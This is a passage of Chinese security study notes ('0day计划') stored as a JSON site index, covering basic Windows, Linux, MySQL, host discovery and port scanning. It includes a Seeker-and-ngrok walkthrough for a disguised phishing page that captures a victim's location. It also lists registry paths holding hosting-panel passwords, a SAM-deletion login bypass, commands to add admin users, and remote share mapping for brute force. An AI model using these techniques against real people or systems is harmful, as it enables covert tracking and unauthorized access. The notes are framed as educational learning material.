{"./":{"url":"./","title":"前言","keywords":"","body":"前言 ​ 本书由None（none.org.cn）创作，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布。 《0DAY计划》是什么 ​ 《0day计划》是本人在网络安全的世界里，学习探索过程中记录总结的零散知识和心得经验，是一本学习笔记。正是如此，本书很多章节尚未完成，今后会在学习的过程中不断完善内容，期望能形成系统化的知识结构。 ​ 本人才疏学浅，此书多有拾人牙慧，恣意妄言者，虽恐见笑于大方，然唯求先进之指教，拳拳之心，不可胜言。 免责声明 ​ 阁下阅读本书即表示同意以下免责声明，需遵守以下约定及当地法律，违反约定所带来的后果由阁下自负。 ​ 本书旨在记录和分享本人的学习经验，内容可能带有攻击性，仅供安全研究与教学之用，读者将其用做其他用途，将由读者承担全部法律及连带责任，本人不承担任何法律及连带责任。 ​ 总而言之，遵纪守法，学好技术，找份好工作，为社会做贡献。 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-21 13:16 "},"社工/获取位置信息.html":{"url":"社工/获取位置信息.html","title":"获取位置信息","keywords":"","body":"获取位置信息 总体思路 首先用Seeker建立一个用于获取对方位置信息的虚假页面，然后用Ngrok建立一个隧道将公网域名连接在本地用Seeker上搭建的虚假页面，接着可以选择用短网址转换的方式对公网域名进行伪装，于是当对方点击了该链接并同意获取位置信息后，我们即可在本机上得到这些信息。 目标页面 选择（创造）一个对目标具有诱惑性的页面/网站。 构建获取定位信息网页 Seeker介绍 Seeker是一款可以获取高精度地理和设备信息的工具。其在内置PHP服务器上托管了一个虚假网站，网站要求提供位置许可，如果目标允许，我们将可以获得对方的设备信息和位置信息。 Seeker用于获取位置信息的模板位于/seeker/template/目录下。 获取&运行seeker root@kali:~# git clone https://github.com/thewhiteh4t/seeker.git root@kali:~# cd seeker/ root@kali:~/seeker# ./install.sh [!] Updating... [!] Installing Dependencies... Python3 PHP ssh Requests [!] Setting Permissions... [!] Installed. root@kali:~/seeker# python3 seeker.py -t manual 使用隧道转发实现内网穿透 Ngrok介绍 Ngrok是一款内网穿透的工具，用于将本地的端口转发到公网上，以便于连接。只需告诉ngrok Web服务器正在侦听的本地端口即可。这样既可以将本地的web服务转发到公网上，也不至于暴露自身的IP。 获取&运行ngrok #搭建起本机与ngrok服务器的隧道（此次的端口应与seeker设置的一致） root@kali:~# ./ngrok http 8080 短网址域名伪装 将以上ngrok产生的网址进行短网址转换进行伪装，以增加可信度。 实际测试 手机端： kali端： 总结 整个过程能否成功的关键在于利用社会工程学诱使对方点击链接并同意授权位置信息，而获取到的位置信息精度则取决于目标设备。 此过程纯粹只是一个概念证明，仅用于教育目的。其主要目的是警示大家不要轻易点击来路不明的链接并授予关键权限，否则你将可能暴露你的设备信息甚至你的位置信息等。 end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 11:00 "},"第一阶段-基础篇/零基础必看课程.html":{"url":"第一阶段-基础篇/零基础必看课程.html","title":"零基础必看课程","keywords":"","body":"零基础必看课程 基础部分 渗透测试 明确目标 信息收集（基础、系统、应用、版本、服务、人员、防护信息） 漏洞探测（系统、WebServer、Web应用、其他端口服务漏洞、通信安全） 漏洞验证（自动化、手工、实验验证；登录猜解、业务漏洞验证） 信息分析（精确打击、绕过防御机制、定制攻击路径、绕过检测机制、攻击代码） 获取所需（实施攻击、获取内部信息、进一步渗透、持续性攻击、清理痕迹） 信息整理 形成报告 虚拟机及系统安装 （略） 虚拟机功能介绍及使用 （略） 网站篇 http协议：超文本传输协议（HTTP，HyperText Transfer Protocol）是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。 http头讲解：（详解https://www.cnblogs.com/poissonnotes/p/4844014.html 200：响应状态码 Accept-Ranges：响应的 HTTP 标头是由服务器使用以通告其支持部分请求的标志物。此字段的值表示可用于定义范围的单位。 Content-Length：请求消息正文的长度 Date ：发送HTTP消息的日期 静态网站：静态网站是指全部由HTML（标准通用标记语言的子集）代码格式页面组成的网站，所有的内容包含在网页文件中。网页上也可以出现各种视觉动态效果，如GIF动画、FLASH动画、滚动字幕等，而网站主要是静态化的页面和代码组成，一般文件名均以htm、html、shtml等为后缀 动态网站：动态网站并不是指具有动画功能的网站，而是指网站内容可根据不同情况动态变更的网站，一般情况下动态网站通过数据库进行架构。动态网站除了要设计网页外，还要通过数据库和编程序来使网站具有更多自动的和高级的功能。动态网站体现在网页一般是以asp，jsp，php，aspx等结束，而静态网页一般是HTML（标准通用标记语言的子集）结尾，动态网站服务器空间配置要比静态的网页要求高，费用也相应的高，不过动态网页利于网站内容的更新，适合企业建站。动态是相对于静态网站而言。 判断一个网站是什么类型的小技巧：在后面加/index.html 或 /index.php 判断一个网站所用系统的小技巧：更改后面字母的大小写，Linux报错win不报错 网站搭建： 服务器配置： 点击详细信息 网站默认本地文件夹：wwwroot 配置DNS服务：添加或删除角色→自定义→DNS服务器→下一步。。。 DNS&域名：\"正向查找\"右键新建区域→下一步。。。右边空白区域右键新建主机→下一步。。。 【DNS改为本地解析127.0.0.1（本地连接属性→TCP/IP属性）】 添加ip：“运行”ncpa.cpl→属性→TCP/IP属性→设定IP→高级→添加 网站能正常运行：需满足【ip，端口(改为1024~65535)，域名】至少一个不同 网站权限配置：右键权限→添加→高级→立即查找→everyone ASP服务启用允许 网站配置：右键属性→【主目录】执行权限：纯脚本→点击配置→选项：启用父路径；调试：启用两个调试→【文档】启用默认文档内容：index.asp 实操成果： Windows基础 系统目录、服务、端口、注册表 系统目录 Program Files：64位软件安装目录 Program Files(x86)：32位软件安装目录 MyDrivers：驱动文件夹 PerfLogs：日志文件夹 自启动文件夹：C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 系统配置文件：C:\\Windows\\System32【config文件夹里的SAM文件为用户账号密码文件（进入PE系统将SAM文件删除即可绕过密码登录）】 hosts文件：C:\\Windows\\System32\\drivers\\etc 服务 作用： 决定计算机的一些功能是否被启用 不同服务对应的功能不同 通过计算机提供的服务可以有效实现资源共享 常见的服务：web服务、dns服务、dhcp服务、邮件服务、telnet服务、ssh服务、ftp服务、smb服务 查看服务命令：services.msc Telnet入侵：DOS命令：telnet 目标ip 端口 计算机“端口”是英文port的义译，可以认为是计算机与外界通讯交流的出口。按端口号可分为3大类：公认端口（Well Known Ports）；注册端口（Registered Ports）；动态和/私有端口（Dynamic and/or Private Ports），共有65535个端口 通过端口可以进行：信息搜集、目标探测、服务判断、系统判断、系统角色分析 注册表 打开注册表：打开“运行”输入regedit回车 注册表作用：注册表是windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着windows的启动、硬件驱动程序的装载以及一些windows应用程序的运行，从而在整个系统中起着核心作用。这些作用包括了软、硬件的相关配置和状态信息，比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等，联网计算机的整个系统的设置和各种许可，文件扩展名与应用程序的关联，硬件部件的描述、状态和属性，性能记录和其他底层的系统状态信息，以及其他数据等。 HKEY_CLASSES_ROOT管理文件系统。 根据在Windows中安装的应用程序的扩展名，该根键指明其文件类型的名称，相应打开该文件所要调用的程序等等信息 HKEY_CURRENT_USER管理系统当前的用户信息。 在这个根键中保存了本地计算机中存放的当前登录的用户信息，包括用户登录用户名和暂存的密码。在用户登录Windows 98时，其信息从HKEY_USERS中相应的项拷贝到HKEY_CURRENT_USER中。 HKEY_LOCAL_MACHINE管理当前系统硬件配置。 在这个根键中保存了本地计算机硬件配置数据，此根键下的子关键字包括在SYSTEM.DAT中，用来提供HKEY_LOCAL_MACHINE所需的信息，或者在远程计算机中可访间的一组键中。这个根键里面的许多子键与System.ini文件中设置项类似。 HKEY_USERS管理系统的用户信息。 在这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表。同时每个用户的预配置信息都存储在HKEY_USERS根键中。HKEY_USERS是远程计算机中访问的根键之一。 HKEY_CURRENT_CONFIG管理当前用户的系统配置。 在这个根键中保存着定义当前用户桌面配置（如显示器等等的数据该用户使用过的文档列表（MRU），应用程序配置和其他有关当前用户的Windows 98中文版的安装的信息。 利用注册表防病毒： 不少计算机系统感染了网络病毒后，可能会在这些注册表中做修改 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices 病毒经常修改的注册表键值 IE起始页的修改 HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main右半部分窗口中的Start Page就是用户当前设置的IE浏览器主页地址了 Internet选项按钮灰化&失效 HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel下的DWORD值“Setting”=dword:1 “Links”=dword:1 “SecAddSites”dword:1全部改为0之后再到HKEY_USERS.DEFAULT\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel下的DWORD值“homepage”键值改为0则无法使用“Internet选项”修改IE设置 “源文件”项不可用 HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions的“NoViewSource”被设置为1了，改为0就可恢复正常 “运行”按钮被取消&失效 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer的“NoRun”键值被改为1了，改为0就可恢复 “关机”按钮被取消&失效 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer的“NoClose”键值被改为1了，改为0就可恢复 “注销”按钮被取消&失效 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer的“NoLogOff”键值被改为1了，改为0就可恢复 磁盘驱动器被隐藏 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer的“NoDrives”键值被改为1了，改为0就可恢复。 入侵中常用的注册表： HKEY_LOCAL_MACHINE\\software\\hzhost\\config\\settings\\mysqlpass HKEY_LOCAL_MACHINE\\software\\hzhost\\config\\settings\\mssqlpss HKEY_LOCAL_MACHINE\\software\\hzhost\\config\\Settings\\mastersvrpass HKEY_LOCAL_MACHINE\\SYSTEM\\LIWEIWENSOFTINSTALLFREEADMIN\\11 HKEY_LOCAL_MACHINE\\SYSTEM\\LIWEIWENSOFTINSTALLFreeHost\\11 黑客常用的DOS命令及批处理 常用DOS命令 color ？ 改变cmd颜色 ping -t -1 65500 ip（死亡之ping，发送大于64K的文件并一直ping） ipconfig /all 查看IP及详细信息 ipconfig/release 释放IP ipconfig/renew 重新获得IP systeminfo 查看系统信息（补丁信息） arp -a 查看局域网内的IP和MAC net view 查看局域网内其他计算机名称 shutdown -s -t 60 -c \"你被黑了\"（-s关机，-r重启，-t倒计时，-c弹窗提示内容） shutdown -a（取消关机） dir 查看目录 cd 切换目录 start www.google.com 打开网页 md 目录名 创建目录 copy con C:\\123.txt 在C盘根目录下创建123.txt文件（Ctrl+Z，回车保存） del 123.txt 删除123.txt tree 树形列出文件夹结构 net use k: \\192.168.1.1\\c$ 将目标IP的C盘映射到本地K盘（可用hydra爆破用户密码） net use k: \\192.168.1.1\\c$ /del 删除 net start 查看开启了哪些服务 net start 服务名 开启服务 net stop 服务名 关闭服务 net user 查看用户 net user 用户名 查看用户属性 net user 用户名 密码 /add 建立用户 net user 用户名 /del 删除用户 net localgroup administrator**s 用户名 /add** 把“用户”添加到管理员中使其具有管理员权限 net user guest /active:yes 激活guest用户 net user guest 123456 用guest用户登录后将密码改为123456 net password 密码 更改系统登录密码 net share 查看本地开启的共享 net share c$ /del 删除C：共享 net share ipc$ 开启ipc$共享 net share ipc$ /del 删除ipc$共享 netstat -a 查看开启了哪些端口，常用netstat -an netstat -n 查看端口的网络连接情况，常用netstat -an netstat -v 查看正在进行的工作 at id号 开启已注册的某个计划任务 at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 at id号 /delete 停止某个已注册的计划任务 at 查看所有的计划任务 attrib 文件名(目录名) 查看某文件（目录）的属性 attrib 文件名-A-R-S-H或+A+R+S+H 去掉或添加某文件的存档，只读，系统，隐藏属性 cls 清屏 ping返回值TTL（默认情况下）：且每经过一个路由则-1 Linux系统的TTL值为64或255 Windows NT/2000/XP系统的TTL值为128 Windows 98系统的TTL值为32 UNIX主机的TTL值为255 批处理 批处理文件是dos命令的组合文件，写在批处理文件的命令会被逐一执行。后缀名为.bat 在cmd中编写批处理文件，copy con c:\\123.bat把输入的内容复制到文件123.bat中，“Ctrl+Z 回车”结束编辑 常用快捷键&优化系统 Windows常用快捷键 F1 显示当前程序或者windows的帮助内容。 F2 当你选中一个文件的话，这意味着“重命名” F3 当你在桌面上的时候是打开“查找：所有文件”对话框 ALT+F4 关闭当前应用程序中的当前文本（如word中） F5 刷新 CTRL+F5 强行刷新 CTRL+F6 切换到当前应用程序中的下一个文本（加shift 可以跳到前一个窗口） F10或ALT 激活当前程序的菜单栏 windows键或CTRL+ESC 打开开始菜单 CTRL+ALT+DELETE 在win9x中打开关闭程序对话框 DELETE 删除被选择的选择项目，如果是文件，将被放入回收站 SHIFT+DELETE 删除被选择的选择项目，如果是文件，将被直接删除而不是放入回收站 CTRL+N 新建一个新的文件 CTRL+O 打开“打开文件”对话框 CTRL+P 打开“打印”对话框CTRL+S保存当前操作的文件 CTRL+X 剪切被选择的项目到剪贴板 CTRL+INSERT或CTRL+C 复制被选择的项目到剪贴板 SHIFT+INSERT或CTRL+V 粘贴剪贴板中的项目 ALT+BACKSPACE 或CTRL+Z 撤销上一步的操作 Ctrl+Shift+ESC打开资源管理器 Win+M 最小化所有被打开的窗口。 Win+D 最小化所有窗口或恢复窗口 Win+L 锁屏 Win+F 打开“查找：所有文件”对话框 Win+R 打开“运行”对话框 系统优化 修改启动项 “运行”对话框中输入“msconfig\"命令，打开系统配置窗口岩找到“启动\"选项 加快系统启动速度 “运行”对话框中输入“msconfig”命令，打开系统配置窗口后找到“引导”选项（英文系统是Boot）。点击“高级选项”此时就可以看到我们将要修改的设置项了。 提高窗口切换提速 右击计算机属性---性能信息和工具---调整视觉效果（先点击让windows选择计算机的最佳设置---再点击自定义---把最后的勾选去掉--确定） 使用工具优化 登录密码破解、手动清除木马病毒 使用启动U盘破解： 微PE启动盘教程：http://www.wepe.com.cn/ubook/ 使用工具对hash值破解： LC5 彩虹表 手动清除木马： 查找开机启动项：“运行”msconfig 查询服务：“运行”services.msc 查看网络端口连接：DOS命令netstat -ano（常见木马端口4444,8888,9527） 拓展：https://www.cnblogs.com/vipsoft/p/3953790.html Linux基础 Linux系统的介绍、安装、密码的破解 Linux内核版本号：XX.YY.ZZ【XX为主版本号，YY为次版本号，次版本号为奇数表示开发版，偶数表示稳定版】 磁盘分区：主分区大于4表示为逻辑分区(例:第2块SCSI硬盘的第3个逻辑分区/dev/sdb7) Linux中默认使用的文件系统类型： EXT3 第3代扩展（Extended）文件系统 SWAP 交换文件系统 Linux支持的其它文件系统类型 FAT16、FAT32、NTFS XFS、JFS Linux系统目录结构，常用命令 Centos 7安装vmtools：点击“虚拟机”重新安装vmtools→打开终端输入“黄色标注”的命令→一直回车→安装完成后重启 Linux 中各个文件夹的作用https://blog.csdn.net/badguy_gao/article/details/78638735 / 根目录 /boot 引导程序，内核等存放的目录 /bin 普通用户可以使用的命令的存放目录 /sbin 超级用户可以使用的命令的存放目录 /lib 根目录下的所程序的共享库目录 /dev 设备文件目录 /home 普通用户的家目录 /root 用户root的$HOME目录 /etc 全局的配置文件存放目录 命令行提示符“#”表示为root用户，“$”表示为普通用户 字符界面与图形界面的切换：Ctrl+Alt+F1图形界面；Ctrl+Alt+F2~7字符界面 Linux命令 用于实现某一类功能的指令或程序 命令的执行依赖于解释器程序（例如：/bin/bash） Linux命令的分类 内部命令：属于Shell解释器的一部分（系统自带的命令） 外部命令：独立于Shell解释器之外的程序文件 命令行编辑的几个辅助操作 Tab键：自动补齐 反斜杠“\\”：强制换行 Ctrl+U：清空至行首 Ctrl+K：清空至行尾 Ctrl+L：清屏 Ctrl+C：取消本次命令编辑 Linux命令的通用命令格式：命令字+选项+参数（命令字 --help） 选项：用于调节命令的具体功能 以“-”引导短格式选项（单个字符），例如“-” 以“--”引导长格式选项（多个字符），例如“-color” 多个短格式选项可以写在一起，只用一个“-”引导，例如“-al\" 参数：命令操作的对象，如文件、目录名等 Linux常用命令： uname -a 查看系统相关信息，显示主机名、硬件平台等详细信息 uname -r 查看内核版本 hostname 主机名称 ifconfig 查看IP地址 cat /proc/cpuinfo 查看CPU信息 cat /proc/meminfo 查看内存信息 halt 或 shutdown -h now 关机 reboot 或 shutdown -r now 重启 pwd 查看当前工作目录 cd 目录位置 切换工作目录 mkdir -p /路径/目录名 创建新的目录 touch 文件名 新建空文件（若已有同名文件，则更新其修改日期，内容不变） ln -s 源文件或目录 链接文件或目标目录 为文件或目录建立快捷方式 mv 源文件或目录 目标文件或目录 移动文件或目录（若位置不变，则相当于改名） find 查找目录 查找条件 查找内容 用于查找文件或目录 常用查找条件： name：按文件名称查找（区分大小写） iname：不区分大小写 size：按文件大小查找（+1024表示大于1024的文件，反之-为小于，默认等于） user：按文件属性查找 type：按文件类型查找 cp 选项 源文件或目录 目标文件或目录 复制文件或目录 cp命令常用选项： r：递归复制整个目录树 p：保持源文件的属性不变 f：强制覆盖目标同名文件或目录 i：需要覆盖文件或目录时进行提醒 rm 选项 文件或目录 删除文件或目录 rm命令常用选项 f：强行删除文件或目录，不进行提醒 i：删除文件或目录时提醒用户确认 r：递归删除整个目录树 du 选项 目录或文件名 统计目录及文件的空间占用情况 du命令常用选项： a：统计时包括所有的文件，而不仅仅只统计目录 h：以更易读的字节单位（K、M等）显示信息 s：只统计每个参数所占用空间总的大小 ls 选项 目录或文件名 列表显示目录内容 ls命令常用选项： l：以长格式显示 a：显示所有子目录和文件的信息，包括隐藏文件 A：类似于“-a”，但不显示“.”和“..”目录的信息 d：显示目录本身的属性 h：以更易读的字节单位（K、M等）显示信息 R：递归显示内容 color：以颜色区分不同类型文件 最前面的-表示其为文件，l表示其为链接(快捷方式)，d表示其为目录 r=4，w=2，x=1，每块权限之和为7； 如：chmod 751 文件名 表示将该文件权限改为-rwxr-x--x. cat 显示文件的全部内容 cat -n 给输出的所有行加上编号 cat 1 2 > 3 合并文件 wc 统计文件中的行数，单词数，字符数 l 统计行数 w 统计单词数 c 统计字符数 history 查看历史命令 压缩命令： gzip 文件名 文件名.gz 压缩文件（源文件变成压缩文件） gzip -9 文件名 文件名.gz 高压缩比压缩文件 gzip -d 文件名.gz 释放压缩文件 bzip2 文件名 文件名.bz2 用bzip2进行压缩（相对于gzip压缩率更高） bzip2 -9 文件名 文件名.bz2 高压缩比压缩文件 bzip2 -d 文件名.bz2 释放压缩文件 归档命令： tar -cvf 归档文件名.tar 被归档文件名1 被归档文件名2 将文件1、2归档，（归档后源文件仍存在） tar -xvf 归档文件名.tar 解包归档文件 tar -cvzf 文件名.tar.gz 被压缩的文件1 被压缩的文件2 创建归档压缩文件后缀为gz tar -cvjf 文件名.tar.bz2 被压缩的文件1 被压缩的文件2 创建归档压缩文件后缀为bz2 tar zxvf 文件.tar.gz 解压释放gz压缩文件 tar jxvf 文件.tar.bz2 解压释放bz2压缩文件 tar -xvzf 文件名.tar.gz -C /usr/src 解压释放归档到/usr/src里面 tar -xvjf 文件名.tar.bz2 -C /usr/src 解压释放归档到/usr/src里面 安装、升级、卸载RPM软件包： rpm 选项 RPM包文件 安装或升级RPM软件 不同选项适用于不同情况 i：安装一个新的RPM软件包 U：升级某个RPM软件，若原本未装，则进行安装 F：更新某个RPM软件，若原本未装，则放弃安装 rpm -e 软件名 卸载指定的RPM软件 apt-get instal 软件包 kali常见安装命令 dpkg -i 软件包 debian常见安装命令 useradd （选项） 用户名 添加用户账号，选项可省略 常用命令选项 u：指定UID标记号 d：指定宿主目录，缺省为/home/用户名 e：指定帐号失效时间 g：指定用户的基本组名（或UID号） G：指定用户的附加组名（或GID号） M：不为用户建立并初始化宿主目录 s：指定用户的登录Shell su - 用户名 切换用户 passwd 用户名 更改该用户密码 userdel -r 用户名 删除该用户（无-r则会保留该用户的宿主目录） 配置yum源：https://www.cnblogs.com/sunshine-H/p/8116701.html Vim编辑器及其命令：http://c.biancheng.net/vi/ Linux系统网络配置 ifconfig 查看所有活动的网络接口信息 ifconfig 网络接口名 查看指定网络接口信息 eth0：以太网 1o：（虚拟）回环设备 ppp0：使用PPP协议的串备（通常指调制解调器） tr0：令牌环（Token Ring） fddi0：光纤 hostname 查看或设置当前主机名 netstat 选项 查看系统的网络连接状态、路由器、接口统计等信息 常用选项： a：显示所有活动连接 n：以数字形式显示 p：显示进程信息 t：查看TCP协议相关信息 u：查看UDP协议相关信息 r：显示路由表信息 网络接囗配置文件在/etc/sysconfig/network-scripts/目录下 域名解析配置文件在/etc/resolv.conf文件下 网站根目录在/var/www/html/目录下 service network restart 重启网络服务（配置完网络后需要重启网络服务） ifdown 网络接口名 禁用网络接口 ifup 网络接口名 启用网络接口 设置路由记录——route route del default gw IP地址 删除路由表中的默认网关记录 route add default gw IP地址 向路由表中添加默认网关记录 route add -net 网段地址/24 gw IP地址 添加到指定网段的路由记录 route del-net 网段地址 删除到指定网段的路由记录 网络基础 网络架构以及TCP/IP协议 网络架构： 局域网 ( LAN ) & 广域网 ( WAN ) OSI参考模型： OSI RM：开放系统互连参考模型（Open System Interconnection Reference Model）OSI参考模型具有以下优点 简化了相关的网络操作 提供设备间的兼容性和标准接口 促进标准化工作 结构上可以分隔 易于实现和维护 内网IP： A级：10.0.0.1 - 10.255.255.254 B级：172.16.0.1 - 172.31.255.254 C级：192.168.0.1 - 192.168.255.254 交换机、路由器的作用及配置 （略） end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 13:09 "},"第一阶段-基础篇/Windows基础.html":{"url":"第一阶段-基础篇/Windows基础.html","title":"Windows基础","keywords":"","body":"Windows基础 ”运行“mstsc 打开远程桌面连接（3389端口） ”运行“gpedit.msc 打开本地组策略编辑器 ”运行“services.msc 打开服务 ”运行“otepad 打开笔记本 ”运行“regefit 打开注册表 ”运行“control 打开控制面板 CertUtil -hashfile C:\\xxx.tar MD5 此命令不仅可以做MD5哈希算法校验，还支持其他的哈希算法，具体如下： CertUtil -hashfile 文件路径 [算法] 支持的算法有：MD2 MD4 MD5 SHA1 SHA256 SHA384 SHA512 end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 10:44 "},"第一阶段-基础篇/数据库基础.html":{"url":"第一阶段-基础篇/数据库基础.html","title":"数据库基础","keywords":"","body":"数据库基础 进入MySQL的方法：在MySQL的bin目录下cmd，mysql.exe -h 主机名(IP) -u 用户名 -p回车输入密码 显示数据库：show databases; 增加数据库：create database 数据库名; 删除数据库：drop database 数据库; 打开数据库：use 数据库名; 显示当前打开的数据库名：select database(); 查看指定数据库中的所有表：show tables; 查看特定表的详细设计信息：describe 表名; 这数据库中创建一个表：create table 表名; 查看表的结构：desc 表名; 增删查改 添加：insert into 表名 values (，，，，顺序排列的数据);（如果数据是字符型，必须使用单引号或者双引号）【insert into users(id,username.password) values(3,'admin3','admin3');】 查询：selec * from 表名 where 条件;【条件如：username='admin'】 删除：delete from 表名 where 条件; 修改：update 表名 set 修改内容 where 条件;【如：update users set id=2 where id=3；】 常用函数 select database();当前使用的数据库 select user();当前数据库用户 select version(); 数据库版本 select load_file(\"文件的绝对路径\");写入文件到数据库【用反斜杠\"/\"】 show global variables like \"%secure% \";查看secure_file_priv变量指向的允许上传文件的位置【默认的为NULL。即不允许导入导出。修改mysql.ini 文件，在[mysqld] 下加入“secure_file_priv =”保存，重启mysql。5.5版本前不需要】 select (\"十六进制字符串\") into dumpfile \"目标路径/01.txt\";在目标路径下创建01.txt【只能写一行】 select …… into outfile \"目标路径\"; 同上【可写多行】 end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 10:43 "},"第二阶段-Web安全篇/2019网络安全训练营.html":{"url":"第二阶段-Web安全篇/2019网络安全训练营.html","title":"2019网络安全训练营","keywords":"","body":"2019网络安全训练营 第一阶段-环境搭建 Metasploitable2 Metasploitable2虚拟系统是一个特别制作的ubuntu操作系统，本身设计作为安全工具测试和演示常见漏洞攻击。版本2已经可以下载，并且比上一个版本包含更多可利用的安全漏洞。这个版本的虚拟系统兼容VMware，VirtualBox，和其他虚拟平台。默认只开启一个网络适配器并且开启NAT和Host-only，本镜像一定不要暴漏在一个易受攻击的网络中。https://sourceforge.net/projects/metasploitable/files/latest/download Metasploitable2默认用户名：msfadmin 密码：msfadmin 网络配置 桥接模式（复制物理网络连接状态）是比较常用的一种网络模式，用来设置虚拟机与主机具有同等的网络地位。前提是需要在动态分配IP地址网络中，如果在静态分配IP地址的网络中，需要手动设置对应的IP地址。 NAT网络地址转换，主机与虚拟机构成一个网络，虚拟机可以与主机以外的网络通信，但是主机以外的网络无法与虚拟机通信。例如：局域网。 仅主机模式，虚拟机完全封闭，不与外部网络通信，只可以与当前主机进行通信。 构建自定义网络架构 在VM中添加新的网络实质是添加新的网卡配置，还要在设置添加网卡和Linux中进行配置：终端输入gedit interfaces回车，末尾换行输入auto eth1，换行输入iface eth1 inet dhcp（eth*可由ifconfig查看），然后重启网络/etc/init.d/networking restart 配置SSH功能 默认情况下Kali下的SSH不允许Root用户远程登录SSH。需要修改配置文件gedit /etc/ssh/sshd_config（修改内容：PermitRootLogin yes和PasswordAuthentication yes） service ssh start开启ssh服务，service ssh status查看ssh服务状态 常用网络命令 netstat -pantu 查看当前tcp udp监听端口 service ssh start/stop 开启/停止服务 ifconfig 查看当前IP地址 /etc/init.d/networking restart 重启网卡 ssh 用户名@IP地址 登录ssh服务 第二阶段-环境配置 Linux下文件操作常用命令 ls -alh -a 查看所有文件夹和文件（包括隐藏） -l 以长格式查看 -h 文件大小以K、M为单位 创建/删除文件夹：mkdir，rmdir 创建/删除文件：touch，rm 重命名文件：mv test1 test2 或 mv test1 ../test2 目录命令：pwd显示当前路径，cd切换目录， . 本级目录， .. 上级目录 Linux下权限相关命令 使用ls -alh查看文件权限信息（user所有者，group所属组，others其他人） chmod 421 文件名 调整权限 kali默认是python2，要用python3 *.py调用 下载github上的工具git clone https://github.com/arismelachroinos/lscript Nessus漏洞扫描器 Nessus是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75000个机构使用Nessus作为扫描该机构电脑系统的软件。官网：https://www.tenable.com 下载：https://www.tenable.com/downloads/nessus ，安装dpkg -i Nessus-8.7.2-debian6_amd64.deb 启动：/etc/init.d/nessusd start 然后打开https://kali:8834/ Win2003 Win2003 IIS 6.0是提供web服务的中间件，存在很多安全问题。比如IIS PUT，解析漏洞等 第三阶段-主机探测 二层主机探测 二层主机探测指：利用OSI中链路层中的协议进行主机发现。一般使用ARP协议。 优点：（局域网中通信使用ARP协议，利用MAC地址作为对应的识别地址） 速度快 可靠性高 缺点：无法扫描经过路由的主机 arping工具 Kali linux下自带工具arping可以进行对应的二层主机发现。缺点：无法多个主机同时扫描。 netdiscover工具 Kali linux自带工具netdiscover可以针对特定子网进行多主机扫描。 三层主机探测 三层主机探测指：利用OSI中网络中的协议进行主机发现。一般使用ICMP协议。 优点： 可以发现远程主机，经过路由的主机 速度相对比较快 缺点： 经常被防火墙过滤 速度相比二层发现慢 ping工具 ping工具在Linux和windows都有自带，Linux下ping如果不指定-c参数，一直扫描。Windows下默认进行四次探测。 fping工具 Kali linux下自带工具fping可以进行对应的三层主机发现。可以针对多个主机同时进行主机发现 如：fping -g 192.168.31.0/24 hping3工具 Kali linux自带工具hping3对目标进行三层主机发现。特点：发送自定义ICMP数据包以绕过防火墙 如：hping3 -c 2 --icmp 192.168.31.1 四层主机探测 四层发现指利用OSI中的传输层协议进行主机发现，一般使用TCP、UDP探测。 优点： 可以探测远程主机 比三层发现更为可靠 缺点：花费时间更长 nmap工具 Kali linux自带的Nmap可以进行二、三、四层的探测。nmap IP地址 hping3工具 Kali linux下自带工具hping3可以进行对应的四层层主机发现。hping3 --udp -c 3 IP地址 主机探测脚本 使用Github上分享的主机发现脚本：https://github.com/Cyber-Forensic/nWatch Tip：【安装过程中显示ImportError: No module named nmap报错，则运行pip install python-nmap，若未找到pip命令，则先运行apt install python-pip】 第四阶段-端口扫描 基本介绍 \"端口”是英文port的意译，可以认为是设备与外界通讯交流的出口。端口可分为虚拟端口和物理端口，其中虚拟端口指计算机内部端口，不可见。例如计算机中的80端口、21端口、23端口等。 一台拥有IP地址的主机可以提供许多服务，比如Web服务、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎样区分不同的网络服务呢？显然不能只靠IP地址，因为IP地址与网络服务的关系是一对多的关系。实际上是通过“IP地址+端口号”来区分不同的服务的。 因此，一个开放的端口代表一个提供的服务，（不同的服务具有不同的端口号，因此要对服务进行测试，首先要确定是否开放对应端口号。 扫描工具Nmap 使用Nmap扫描指定主机的端口信息。Nmap具有多张扫描端口的技术。 扫描工具Dmitry 使用dmitry进行端口扫描，其中p参数指定dmitry进行tcp端口扫描。 扫描工具netcat 使用Netcat进行端口扫描。nc -nvz IP地址 端口范围 端口的分类 端口范围0-65535，TCP端口和UDP端口。由于TCP和UDP两个协议是独立的，因此各自的端口号也相互独立，比如TCP有235端口，UDP也可以有235端口，两者并不冲突。 端口分为： 周知端口 